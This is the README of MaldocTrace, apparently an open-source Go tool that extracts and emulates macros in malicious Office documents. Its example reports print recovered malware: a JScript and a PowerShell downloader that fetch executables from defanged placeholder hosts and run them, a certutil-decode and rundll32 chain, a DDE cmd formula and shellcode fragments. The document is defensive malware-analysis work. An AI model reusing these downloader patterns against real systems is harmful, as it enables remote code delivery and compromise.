# MaldocTrace

MaldocTrace is a defensive analyzer for malicious Office documents, written in Go. It extracts VBA and Excel 4.0 (XLM) macros, rebuilds obfuscated strings, and emulates the macros in a fully simulated environment. The output reports what the document *would* do: the commands it would run, the payloads it would decode and the files it would drop. All of it is backed by evidence that points to the module, procedure and line (or sheet and cell) that produced it.

Documents with no macros at all are covered too. Remote template injection, DDE fields, linked and embedded OLE objects (including Equation Editor exploits in RTF), hyperlinked lure images and VBA stomping are reported as static findings.


---

## Features

- **Container extraction**: OLE/CFB (`.doc`, `.xls`, `.ppt`), OOXML (`.docx`, `.docm`, `.xlsx`, `.xlsm`, `.pptm`), RTF and raw VBA text. Includes MS-OVBA decompression, UserForm control properties, and resource limits against zip bombs and malformed containers.
- **Encrypted documents**: Excel's default password `VelvetSweatshop`, a short list of common passwords and any `--password` you give are tried against:
  - `.xls` workbooks encrypted with RC4 or RC4 CryptoAPI (`FILEPASS`), so cells and Excel 4.0 macro sheets can be read. The VBA project of an `.xls` is stored outside the encrypted stream and is always extracted;
  - OOXML files wrapped in `EncryptionInfo`/`EncryptedPackage` with ECMA-376 Standard (AES) or Agile (AES, SHA-1/256/384/512) encryption.

  The report gives the scheme and the password that worked. When none works, it says so: the absence of macros then proves nothing.
- **Excel 4.0 (XLM) macros**:
  - macro sheets from `.xls` (BIFF8 formulas decompiled from parsed tokens, using the MS-XLS function tables) and `.xlsm`, including hidden and very hidden sheets;
  - an XLM interpreter that starts at `Auto_Open` (any name Excel would run). It follows `GOTO`, `RUN`, `IF`, `WHILE`/`FOR`/`NEXT`, `ON.TIME` and `RETURN`, and applies `FORMULA`/`FORMULA.FILL`/`SET.VALUE`/`SET.NAME`, so self-decoding macros rebuild their real code;
  - simulated `EXEC`, `CALL`, `REGISTER` and aliases (`URLDownloadToFileA`, `ShellExecuteA`, `WinExec`, `CreateProcessA`) and `FOPEN`/`FWRITE`. Anti-sandbox probes (`GET.WORKSPACE`, `GET.WINDOW`, `GET.CELL`) get plausible answers, flagged as simulated;
  - the formulas written at run time are listed as the deobfuscated macro.
- **Static findings** (no emulation needed):
  - remote template injection (`attachedTemplate`, RTF `\*\template`, the attached template of Word 97-2003 `.doc` files);
  - external OLE objects, including MHTML (CVE-2021-40444) and `ms-msdt` (Follina) monikers;
  - DDE/DDEAUTO, `INCLUDEPICTURE`, `INCLUDETEXT` and `LINK` fields (including `QUOTE`-encoded ones) in `.docx`, RTF and every story of `.doc` files (body, headers, footnotes, comments, text boxes), and Excel DDE formulas and links;
  - embedded and linked OLE objects of `.doc` files (`ObjectPool`): class and ProgID, OLE Packages (label, original and temp path), URL and file monikers of linked objects (CVE-2017-0199 pattern) and Equation Editor exploits;
  - RTF embedded objects decoded the way Word reads them (obfuscated `\objdata`, corrupted OLE1 headers), with Equation Editor exploit detection: the MTEF FONT overflow (CVE-2017-11882 / CVE-2018-0802) and the MATRIX overflow (CVE-2018-0798), plus extraction of the bytes that follow;
  - hyperlinks on pictures and cells, and QR-code lures;
  - embedded and linked OLE objects of `.xls` (`MBD` storages), `.doc` (`ObjectPool`) and OOXML (`embeddings/`) files: linked objects with URL monikers, OLE Packages, Equation Editor data, and the files they carry (PDF with its active-content markers and links, scripts, executables, archives). Embedded documents are analysed recursively and reported under `children` with their own verdict;
  - when nothing is found, the text report lists what was checked (also in the JSON `checks` field);
  - **VBA stomping**: string literals compiled into the p-code but missing from the source mean the source shown is not the code Office runs. Those literals are reported and scanned for indicators.
- **Payload hiding places**: cell values (`Sheets("x").Range("A1")`, `Cells(r, c)`), document properties (`BuiltInDocumentProperties("Comments")`, custom properties), document variables (`ActiveDocument.Variables`, from `.docx` settings and the `StwUser` table of `.doc` files) and UserForm controls (`TextBox.Text`, `Label.Caption`) are all available to the emulated macro.
- **Document body text**: extracted from Word 97-2003 (piece table) and `.docx`. Droppers often hide their payload in the document body and read it back through `ActiveDocument.Paragraphs(n).Range.Text`.
- **VBA interpreter**: a lexer, parser and bounded interpreter covering the subset of VBA that malware relies on: procedures, `ByRef` parameters, named arguments, conditional compilation, loops, arrays and the string built-ins.
- **Static deobfuscation**: constant folding of `Chr`/`StrReverse`/`Replace`/concatenation. Each value records how it was rebuilt (`concatenation+Chr`, `StrReverse`, ...).
- **Simulated environment**:
  - processes: `WScript.Shell`, `Shell`, WMI `Win32_Process.Create` (both `GetObject` and `CreateObject("winmgmts:...")`)
  - files and network: `FileSystemObject`, `ADODB.Stream` (position, text/binary mode and charsets), `XMLHTTP`/`WinHttp`
  - `MSXML2.DOMDocument` elements, including the `bin.base64`/`bin.hex` decoding trick
  - script engines: `MSScriptControl.ScriptControl`; commands that the script runs through a `WScript.Shell` exposed with `AddObject` are recovered
  - Word's document model: `Paragraphs`, `Range`, `Delete`, `SaveAs2`
  - Excel's object model (`Sheets`, `Worksheets`, `Range`, `Cells`, `Offset`), shared with the XLM engine, and `ExecuteExcel4Macro`/`Application.Run` into macro sheets
  - declared Windows APIs, with simulated `VarPtr` pointers
- **Payload recovery**:
  - PowerShell `-EncodedCommand` decoding, with static folding of `'ht'+'tp'` concatenations before URLs are extracted
  - UTF-7 shellcode buffers passed to `MultiByteToWideChar(CP_UTF7)`
  - `certutil -decode`, reproduced over a virtual file system built from what the macro wrote
  - scripts passed to `ScriptControl.AddCode`, reported as script payloads rather than command lines
  - binary payloads stored as hex text split across string literals, recovered statically even when the macro itself would fail
  - PE/ZIP/OLE/PDF identification from file headers
- **Shellcode and PE profiling** (static; nothing is executed):
  - API hashing: classic ROR13 `block_api` hashes and the randomized variant with a seeded, chained hash, resolved to `module!function`;
  - stager configuration: `reverse_http(s)` host, port, URI, `User-Agent` and `Host` header (domain fronting), `reverse_tcp` IP and port, `URLDownloadToFile` URLs. These become indicators;
  - XOR decoder stubs (`xor byte [reg], imm8`) and single-byte XOR keys that reveal URLs;
  - PE files: subsystem, entry point, sections with entropy and RWX flags, imports grouped by behaviour (injection, network, persistence...), .NET and UPX markers, overlay and PDB path.
- **Provenance everywhere**: commands, payloads and indicators carry evidence IDs (`event-3`, `command-1`, `payload-1`) and source locations. Secondary views refer to an item by its ID instead of repeating large blobs.
- **Robust against hostile input**: each pipeline stage recovers from panics and records the failure as a diagnostic. A bad sample therefore never kills a batch run. The VBA pipeline and the container parsers are fuzzed.

---

## Download

Prebuilt binaries for **Windows**, **Linux** and **macOS** (x64 and ARM64) are on the [Releases](https://github.com/debugactiveprocess/MaldocTrace/releases) page, along with SHA-256 checksums. Each release's notes come from [CHANGELOG.md](CHANGELOG.md).

With a package manager:

```bash
# macOS / Linux (Homebrew)
brew install debugactiveprocess/tap/maldoctrace

# Windows (Scoop)
scoop bucket add maldoctrace https://github.com/debugactiveprocess/scoop-bucket
scoop install maldoctrace/maldoctrace
```

## Build

Requires Go 1.23+. Dependencies: `golang.org/x/text` and, for 7z archives, [`github.com/bodgit/sevenzip`](https://github.com/bodgit/sevenzip).

Install a tagged release:

```bash
go install github.com/debugactiveprocess/MaldocTrace/cmd/maldoctrace@v0.4.0
```

Or build from a release tarball or a clone:

```bash
go build -o maldocTrace ./cmd/maldoctrace
```

On Windows:

```bash
go build -o maldocTrace.exe ./cmd/maldoctrace
```

## Usage

```
maldocTrace inspect <file>
maldocTrace extract <file> --out <dir> [--force]
maldocTrace analyze <file> [--format json|text|jsonl] [--timeout 30s] [--max-steps N]
                           [--input-format vba] [--show-strings] [--dump-payloads DIR]
                           [--password PW]...
maldocTrace analyze <dir> --recursive [--format jsonl] [--workers N]
maldocTrace version
```

| Option | Description |
|---|---|
| `--format text` | Human-readable report (default). |
| `--format json` | Full, versioned JSON report (schema `1.6.0`). It always includes indicators, diagnostics, decoded strings and full payload content. |
| `--format jsonl` | One JSON report per line, for batch analysis with `--recursive`. |
| `--show-strings` | Text format only. Lists the reconstructed strings, deduplicated, with every module/procedure/line occurrence and the reconstruction method. |
| `--dump-payloads DIR` | Writes decoded payloads and files dropped by the macro to `DIR/<input-sha256>/`, with a `manifest.json`. Files get neutral extensions (`.bin`, `.txt`), so nothing can run on a double-click. Existing files are never overwritten. |
| `--password PW` | Extra password to try on encrypted documents, before the built-in list (`VelvetSweatshop` and common passwords). Repeat it to try several. |
| `--input-format vba` | Analyze a plain-text VBA file. |
| `--timeout`, `--max-steps` | Per-file time budget and interpreter step budget. |

### Evasive Word formats

Word also opens documents that are not `.doc` or `.docx` containers, and droppers use them because many scanners do not look inside: Word 2003 XML (`w:wordDocument`, with the VBA project as a base64 ActiveMime blob in `w:binData`), Flat OPC (`pkg:package`, every OOXML part inline) and MHT/MHTML web archives with an ActiveMime part. MaldocTrace decodes them in memory and analyses the VBA project, fields and templates they carry like any other document.

### SYLK, IQY and CSV

Excel opens text spreadsheets without the protections of a workbook. SYLK files (`.slk`) can be Excel 4.0 macro sheets with an `Auto_Open` name: their cells are rebuilt and emulated like an `.xls` macro sheet. IQY web queries make Excel fetch a URL (reported as a high-severity finding), and CSV cells with DDE formulas (`=cmd|' /c ...'!A0`) are reported as DDE.

### OneNote

OneNote sections (`.one`) are a common dropper since Office blocked internet macros: a lure picture sits over an embedded HTA, batch file, script, shortcut or executable. MaldocTrace extracts every embedded file, classifies it by content, reports scripts (with the commands and indicators in them) and executables, and analyses embedded documents as children.

### Emails

`.eml` and Outlook `.msg` files are analysed as containers: the report shows the sender, recipient, subject, date and attachment names, extracts URLs from the bodies as indicators, and analyses every attachment (documents, archives, scripts, attached messages) as a child report.

### Archives

Samples usually travel in password-protected archives. `analyze` opens ZIP (ZipCrypto and WinZip AES) and 7z archives in memory, trying `infected`, `malware`, `virus` and any `--password`, and analyses every member. Nothing is written to disk. Office documents, emails and nested archives inside get their own report under `children`; scripts and executables are listed with their hash and type. Bomb protection: at most 512 members, 64 MiB per member, 512 MiB in total and a bounded compression ratio.

7z support uses [github.com/bodgit/sevenzip](https://github.com/bodgit/sevenzip) (BSD-3-Clause). It is the only third-party dependency besides `golang.org/x/text`, with its own decompressors (`klauspost/compress`, `ulikunitz/xz`, `andybalholm/brotli`, `pierrec/lz4`).

Exit codes: `0` success (even when the sample is malicious), `1` analysis or internal error, `2` usage error, `3` the `--fail-on` threshold was met.

Every report starts with a **verdict** (`malicious`, `suspicious`, `clean` or `unknown`), a risk score from 0 to 100 and the reasons that produced it. The score adds up the evidence: recovered commands, static findings by severity (a high-severity DDE field, remote template, linked object, Equation Editor exploit or `Auto_Open` macro sheet alone is malicious), decoded payloads, executable files, macros with auto-run entry points, network indicators, Excel's default encryption password, and the verdicts of embedded files. A partial analysis (timeout, limit hit, unknown password) that found nothing is `unknown`, never `clean`. The JSON field `checks` lists what was examined. For pipelines, `--fail-on suspicious` or `--fail-on malicious` turns the verdict into exit code `3`.

---

## Examples

The four reports below come from real malicious documents and show the main recovery paths. Long blobs are shortened with `…`. The full values are in the JSON output.

### 1. UTF-7 shellcode loader (`MultiByteToWideChar` → `EnumUILanguages`)

The macro fills a byte array with UTF-7 text and copies it into RWX memory with `MultiByteToWideChar(65000, …, VarPtr(buf(0)), …)`. It then runs the memory through an `EnumUILanguages` callback. MaldocTrace resolves `VarPtr` to the array, captures the buffer and decodes the UTF-7 statically. The result is x64 shellcode (`90 55 48 89 e5` = `nop; push rbp; mov rbp,rsp`).

```
$ maldocTrace analyze 394c97cc9d567e556a357f129aea03f737cbd2a1761df32146ef69d93afc73dc.doc
MaldocTrace 0.1.0 (schema 1.2.0)
File: 394c97cc9d567e556a357f129aea03f737cbd2a1761df32146ef69d93afc73dc.doc (60418 bytes)
SHA-256: 394c97cc9d567e556a357f129aea03f737cbd2a1761df32146ef69d93afc73dc
Format: ooxml
Status: partial | Macros: present
Operational: completed | Semantic coverage: partial

-- Recovered commands --
  [command-1] In-memory payload via MultiByteToWideChar
      Command: +VZCJSFXlgUiA7A-\x00+6AA-\x00\x00+SF3tg0gSTY1IL8LHA3I-\x00+EfYxgEgbwf//SHXKgfNvqMHg5ITk5G+p/KRp…
      Receiver: kernel32.MultiByteToWideChar
      Source: ThisDocument.lllIiIjLliJjJIlJ:113 (inherited=false)
      Discovery: emulated_call
      Execution: simulated
      Resolution: resolved

-- Decoded payloads and recovered scripts --
  [payload-1] UTF-7 buffer (ljLLJJLJjjjjJijI(0))
      Category: binary | 1858 bytes | sha256=063d85ce18b08987b75b57c5e01d1d7e8183b54d56c4473eca415285cb28a555
      Encoding: UTF-7 → UTF-16LE
      Content (hex):
        90554889e5554881ec80000000e8000000005d4883ed12488d4d2f48c7c27203
        0000f61180311b48ffc148ffca75f381a86fe0c184e4e4e4a96fa4fca96984f4
        …
      Derived from: command-1
      Status: decoded

-- Entry points --
  ThisDocument.DoCUmeNT_OPEn  (Document_Open event)

-- Modules --
  ThisDocument  (document/class/designer, 137195 chars)

-- Simulated operations --
  #1 api_call [ThisDocument.lllIiIjLliJjJIlJ:112] -1  0 20480 12288 64
  #2 api_call [ThisDocument.lllIiIjLliJjJIlJ:113] → command-1
  #3 api_call [ThisDocument.lllIiIjLliJjJIlJ:114]  0 0 0

Reconstructed strings: 4395 (hidden; use --show-strings, or see decoded_strings in JSON)
```

### 2. Payload hidden in the document body (`certutil -decode` + `rundll32`)

The macro reads command fragments from paragraphs 2, 4, 6 and 8 of the document. Each one is cut with `Left()` to an exact length: `C:\Users\Public\`, `winmgmts:Win32_Process`, `Rundll32` and `Certutil -decode`. The macro then deletes the 3561-character decoy text and saves the rest of the body, a Base64-encoded PE, as `Ksh1.xls`. It decodes that file with `certutil` and loads the result with `rundll32`. MaldocTrace replays the whole chain over its simulated document and virtual file system and recovers the DLL.

```
$ maldocTrace analyze 7dbd8ecfada1d39a81a58c9468b91039.doc
MaldocTrace 0.1.0 (schema 1.2.0)
File: 7dbd8ecfada1d39a81a58c9468b91039.doc (850432 bytes)
SHA-256: dc40e48d2eb0e57cd16b1792bdccc185440f632783c7bcc87c955e1d4e88fc95
Format: cfb
Status: complete | Macros: present
Operational: completed | Semantic coverage: supported_subset

-- Recovered commands --
  [command-1] command
      Command: Certutil -decode C:\Users\Public\Ksh1.xls C:\Users\Public\Ksh1.pdf
      Receiver: Win32_Process.create
      Source: ThisDocument.SetTask:41 (inherited=true)
      Discovery: emulated_call
      Execution: simulated
      Resolution: resolved
  [command-2] command
      Command: Rundll32 C:\Users\Public\Ksh1.pdf,In
      Receiver: Win32_Process.create
      Source: ThisDocument.SetTask:41 (inherited=true)
      Discovery: emulated_call
      Execution: simulated
      Resolution: resolved

-- Decoded payloads and recovered scripts --
  [payload-1] certutil -decode output → C:\Users\Public\Ksh1.pdf
      Category: binary | 446976 bytes | sha256=fb07f875dc45e6045735513e75a83c50c78154851bd23a645d43ea853e6800ac
      Encoding: Base64 (certutil -decode)
      File type: PE32 DLL
        machine=0x014c
        compiled=2020-10-28T04:01:47Z
        sections=.text,.rdata,.data,.rsrc,.reloc
      Note: input C:\Users\Public\Ksh1.xls written by event-3
      Note: loaded by command-2: Rundll32 C:\Users\Public\Ksh1.pdf,In
      Content (hex, first 256 of 446976 bytes; full content in JSON decoded_payloads):
        4d5a90000300000004000000ffff0000b8000000000000004000000000000000
        …
      Derived from: command-1
      Status: decoded

-- Entry points --
  ThisDocument.Document_Close  (Document_Close event)
  ThisDocument.Form_Close  (ActiveX/event handler ending _close)

-- Modules --
  ThisDocument  (document/class/designer, 1510 chars)

-- Simulated operations --
  #1 create_object [ThisDocument.Form_Close:24] winmgmts:Win32_Process
  #2 document_range_edit [ThisDocument.Form_Close:27]
  #3 document_saveas [ThisDocument.SaveAs3:38] C:\Users\Public\Ksh1.xls
  #4 document_saveas [ThisDocument.SaveAs3:38] C:\Users\Public\Ksh1.doc
  #5 wmi_process_create [ThisDocument.SetTask:41] → command-1
  #6 api_call [ThisDocument.Form_Close:29] 6000
  #7 wmi_process_create [ThisDocument.SetTask:41] → command-2

-- Reconstructed artifacts --
  C:\Users\Public\Ksh1.xls sha256=9de083f693c144a38d697089f6560a2efe81b1ad1c5385ec07d6b41bb54b8ffe (595972 bytes)
  C:\Users\Public\Ksh1.doc sha256=9de083f693c144a38d697089f6560a2efe81b1ad1c5385ec07d6b41bb54b8ffe (595972 bytes)

Reconstructed strings: 20 (hidden; use --show-strings, or see decoded_strings in JSON)
```

`Form_Close` is a decoy name. It already runs inside `Document_Close`, so MaldocTrace does not replay it as a second entry point.

### 3. JScript through `MSScriptControl.ScriptControl`

The macro creates a `ScriptControl`, sets its language to JScript, adds a downloader through `AddCode` and then calls `Run "hexer"`. The JavaScript is reported as a **script payload**. `hexer` is reported as a **script function call**, not as an operating-system command. The `ScriptControl` object reaches the helper procedures through `ByRef` parameters, as it does in real VBA.

```
$ maldocTrace analyze 9eebae3cce1e63f01eaa6867ae8537cf19162527bb7e7d752282f0e20dc03a66.bin
MaldocTrace 0.1.0 (schema 1.2.0)
File: 9eebae3cce1e63f01eaa6867ae8537cf19162527bb7e7d752282f0e20dc03a66.bin (178819 bytes)
SHA-256: 9eebae3cce1e63f01eaa6867ae8537cf19162527bb7e7d752282f0e20dc03a66
Format: ooxml
Status: complete | Macros: present
Operational: completed | Semantic coverage: supported_subset

-- Decoded payloads and recovered scripts --
  [payload-1] Script (JScript) via ScriptControl.AddCode
      Category: script | Language: JScript | 555 bytes | sha256=cbf2ae49467472c81c8d7dc3492cae31073050a6ab41414a12a0e82c9f6ff7fa
      Defines: hexer
      Content:
        function hexer () { var shell = new ActiveXObject ("WScript.Shell");var fso = new ActiveXObject ("Scripting.FileSystemObject");var tmp_path = fso.GetSpecialFolder( 2) + "\\\\" + fso.GetTempName();var stream = new ActiveXObject ("ADODB.Stream");stream.Open();stream.Type = 1;stream.Position = 0; var ass = new ActiveXObject("Microsoft.XMLHTTP");ass.open("GET", "hxxp://host1.example[.]invalid/load5.exe", 0);ass.send();stream.Write(ass.ResponseBody);stream.SaveToFile(tmp_path);stream.Close();var cmdrun = "cmd.exe /c " + tmp_path; shell.run(cmdrun, 0); }
      Derived from: event-2
      Status: recovered

-- Script engine calls (not OS commands) --
  [script-call-1] JScript MSScriptControl.ScriptControl.Run → hexer()
      Defined in: payload-1
      Source: ThisDocument.enamwy0:1403 (inherited=true)
      Execution: not_executed

-- Entry points --
  ThisDocument.AutoOpen  (AutoOpen)

-- Modules --
  ThisDocument  (document/class/designer, 28600 chars)

-- Simulated operations --
  #1 create_object [ThisDocument.eqxomy:1407] MSScriptControl.ScriptControl
  #2 script_add_code [ThisDocument.glufvaqv:1395] → payload-1
  #3 script_run [ThisDocument.enamwy0:1403] → script-call-1
  #4 document_range_edit [ThisDocument.ujsorzyca:1448]

Reconstructed strings: 292 (hidden; use --show-strings, or see decoded_strings in JSON)
```

### 4. PowerShell `-EncodedCommand` through WMI

The macro starts PowerShell through `winmgmts:Win32_Process.Create`. MaldocTrace decodes the Base64/UTF-16LE command and statically folds the `'ht'+'tp'+…` concatenations (nothing is executed). It then extracts the complete download URLs. Fragments such as `http://o` are never reported as URLs. The Base64 is printed in full only once; the other sections refer to it as `command-1`.

```
$ maldocTrace analyze PO-465514-180820.doc.bin
MaldocTrace 0.1.0 (schema 1.2.0)
File: PO-465514-180820.doc.bin (178840 bytes)
SHA-256: 044aa7e93ec81b297b53aaebad9bbac1a9d754219b001aaf5d4261665af30bc7
Format: cfb
Status: partial | Macros: present
Operational: completed | Semantic coverage: partial

-- Recovered commands --
  [command-1] PowerShell
      Command: powersheLL -e JABPAGcAbwB1AF8ANQAxAD0AKAAnAFEAdAA3ACcAKwAnADEAJwArACcAdABsADUAJwApADsALgAoACcAbgBlACcAKwAnAHcALQBp…
      Receiver: Win32_Process.Create
      Source: Qh300jh2fz8xvw.Hbpixwncmtfs0n:120 (inherited=true)
      Discovery: emulated_call
      Execution: simulated
      Resolution: resolved

-- Decoded payloads and recovered scripts --
  [payload-1] PowerShell EncodedCommand
      Category: encoded_command | Language: PowerShell | 2514 bytes | sha256=5d577b5d9853ff67f14930be4c6c1069c498760cb0276d986d95f8d300773632
      Encoding: Base64 → UTF-16LE
      Content (normalized: powershell_string_concatenation; raw in JSON):
        $Ogou_51=('Qt71tl5');.('new-item') $ENV:tEmp\OFFICE2019 -itemtype DiREctorY;[Net.ServicePointManager]::"S`eCUriTy`PrOT`OC`Ol" = ('tls12, tls11, tls');$Qakfo0q = ('Z0fv3kbg');$Brv35rs=('E6h4nkn');$Ec9w4e0=$env:temp+(('N3pOffice2019N3p')."re`Pl`AcE"('N3p',[sTriNg][CHaR]92))+$Qakfo0q+('.exe');$Z_jji3m=('Ogp57wj');$Y7jmxz8=&('new-object') NET.webcLIEnt;$Innewc_=('hxxp://host2.example[.]invalid/a/*hxxp://host3.example[.]invalid/b/*hxxps://host4.example[.]invalid/c/*hxxp://host5.example[.]invalid/d/*hxxp://host6.example[.]invalid/e/')."sP`lIt"([char]42);$Fe8neg4=('Kymrw9w');foreach($Msuonh8 in $Innewc_){try{$Y7jmxz8."DoW`NLoAd`Fi`LE"($Msuonh8, $Ec9w4e0);$Ui3l49g=('Dohxbzg');If ((&('Get-Item') $Ec9w4e0)."lEng`Th" -ge 31451) {&('Invoke-Item')($Ec9w4e0);$Cwio_h5=('E6vp7vw');break;$Tay50lk=('Ph10gb1')}}catch{}}$U7tmnk4=('Yewcw8k')
      Derived from: command-1
      Status: decoded

-- Entry points --
  G6srlicitafymaaqhy.Document_open  (Document_Open event)

-- Modules --
  G6srlicitafymaaqhy  (document/class/designer, 365 chars)
  Qh300jh2fz8xvw  (document/class/designer, 10724 chars)

-- Simulated operations --
  #1 create_object [Qh300jh2fz8xvw.Hbpixwncmtfs0n:64] winmgmts:win32_Process
  #2 create_object [Qh300jh2fz8xvw.Vvdiedgnt3d:143] winmgmts:win32_ProcessstartuP
  #3 wmi_process_create [Qh300jh2fz8xvw.Hbpixwncmtfs0n:120] → command-1

Reconstructed strings: 98 (hidden; use --show-strings, or see decoded_strings in JSON)
```

### 5. Equation Editor exploit in an obfuscated RTF (no macros)

The RTF hides an `Equation.3` object behind junk control-word parameters, ignorable groups and a corrupted OLE1 header. MaldocTrace decodes `\objdata` the way Word does. It then finds the oversized MTEF `MATRIX` record and extracts the bytes that follow it, which are the first-stage shellcode.

```
MaldocTrace 0.2.0 (schema 1.3.0)
File: Project No.88719_ECOFIX.rtf.bin (123376 bytes)
SHA-256: 4488de9b8c97006d9784b08dd4d8d41de2473253dd4d58e93e8b2a68eb6a97db
Format: rtf
Status: complete | Macros: absent
Operational: completed | Semantic coverage: supported_subset

-- Static findings --
  [finding-1] ole_link (medium)
      Location: rtf offset 14547
      Detail: object declared as a link (\objautlink/\objlink): Word refreshes it from its source
  [finding-2] ole_autoupdate (medium)
      Location: rtf offset 14610
      Detail: \objupdate makes Word load the object when the document opens, without user interaction
  [finding-3] embedded_ole (high)
      Target: EquATioN.3
      Location: rtf \objdata at offset 14584
      Detail: embedded OLE object of class EquATioN.3 (1414 bytes); Equation Editor object (EQNEDT32.EXE, a frequent exploit target); MTEF MATRIX record declares 236 rows x 30 columns, overflowing Equation Editor's partition buffer (CVE-2018-0798)
  [finding-4] equation_editor_exploit (high)
      Target: 0000…29c34400000000e844000000eb42eb60e99a000000e99d0000009c515681e9067e0000… [truncated display: 2048 bytes; full value in JSON static_findings]
      Location: rtf \objdata at offset 14584
      Detail: MTEF MATRIX record declares 236 rows x 30 columns, overflowing Equation Editor's partition buffer (CVE-2018-0798); target is the bytes after the malformed record (hex; usually the first-stage shellcode)
```

### Dumping payloads

```
$ maldocTrace analyze 7dbd8ecfada1d39a81a58c9468b91039.doc --format json --dump-payloads ./dumps > report.json
dumped dumps/dc40e48d…/payload-1.bin      # the PE32 DLL (sha256 fb07f875…)
dumped dumps/dc40e48d…/artifact-1.bin     # C:\Users\Public\Ksh1.xls as written by the macro
dumped dumps/dc40e48d…/artifact-2.bin     # C:\Users\Public\Ksh1.doc
dumped dumps/dc40e48d…/manifest.json
```

For every file, `manifest.json` records the evidence ID, payload kind, detected file type, origin path, provenance (`written by event-3`, `loaded by command-2`) and both the report's sha256 and the written file's sha256.

---

## JSON report

`--format json` emits a self-contained, versioned report. The main sections are:

| Field | Content |
|---|---|
| `static_findings` | Template injection, external/embedded OLE objects, DDE, Equation Editor exploits, hyperlinks, hidden macro sheets and VBA stomping, each with kind, severity, location, target and evidence. |
| `macro_sheets` | Excel 4.0 macro sheets with visibility and every formula (cell, formula text, cached value). |
| `document_properties` | Built-in and custom document properties and document variables. |
| `commands` | Recovered command lines and in-memory payload sinks, with receiver, source location, call chain and evidence IDs. |
| `decryption` | For encrypted documents: the scheme, whether it was decrypted, and the password that worked (or why it could not be opened). |
| `decoded_payloads` | Decoded PowerShell, scripts, shellcode buffers and certutil outputs. Each payload has its raw and normalized content, encoding chain, sha256, file type, profile facts (API hashes, stager configuration, PE imports) and provenance. |
| `script_calls` | Script-engine invocations (`ScriptControl.Run/Eval/ExecuteStatement`). |
| `indicators` | Deduplicated URLs, domains, IPs, paths, registry keys and commands, with every occurrence. `same_as` and `part_of` link an indicator to the command or payload it duplicates. |
| `events` | Every simulated operation, with raw and resolved arguments. |
| `decoded_strings` | Statically reconstructed strings, with location and reconstruction method. |
| `artifacts` | Files written by the macro, with their hashes. |
| `diagnostics` | Analysis limitations, unsupported features and recovered internal errors. |

The text report omits indicators and diagnostics for readability. The JSON report always contains everything.

---

## Project layout

```
cmd/maldoctrace/   CLI (inspect, extract, analyze, payload dumping)
extractor/         CFB/OOXML/RTF containers, MS-OVBA, UserForms, Word body text, BIFF8 workbooks
                   and formula decompiler, document properties, external references
vba/lexer          VBA tokenizer
vba/parser         VBA parser (incl. conditional compilation, named arguments)
vba/runtime        Bounded VBA interpreter, built-ins, simulated pointers
deobfuscation/     Static constant folding with provenance
emulation/         Simulated COM objects, WMI, ScriptControl, Word and Excel object models, XLM engine
payload/           PowerShell, UTF-7, certutil decoding, concatenation folding, binary identification
indicators/        IOC extraction
report/            JSON schema and text renderer
internal/cfbtest   Builders for synthetic OLE files and BIFF8 macro workbooks used by tests
```

## Testing

```bash
go test ./...
```

Regression tests that use real samples look for them in `samples/` and are skipped when that folder is missing. The samples are not distributed. The pipeline is fuzzed:

```bash
go test -run '^$' -fuzz '^FuzzAnalyzeVBA$' -fuzztime 60s .
go test -run '^$' -fuzz '^FuzzAnalyzeBytes$' -fuzztime 60s .
go test -run '^$' -fuzz '^FuzzParseXLM$' -fuzztime 60s ./emulation
go test -run '^$' -fuzz '^FuzzBIFF$' -fuzztime 60s ./extractor   # also FuzzDecompile, FuzzRTF
```

Inputs that made the fuzzers fail are kept under `testdata/fuzz/` as permanent regression cases.

## Releasing

1. Add a `## [X.Y.Z] - YYYY-MM-DD` section to [CHANGELOG.md](CHANGELOG.md).
2. Tag the commit on `main` and push the tag:

   ```bash
   git tag vX.Y.Z
   git push origin vX.Y.Z
   ```

The [release workflow](.github/workflows/release.yml) then runs the tests and builds static binaries for Windows, Linux and macOS (amd64/arm64), stamping each with the version from the tag. It publishes a GitHub Release with the archives, `checksums.txt` and that CHANGELOG section as notes. A tag without a matching CHANGELOG section fails instead of publishing an empty release.

## License

MaldocTrace is released under the [Apache License 2.0](LICENSE).
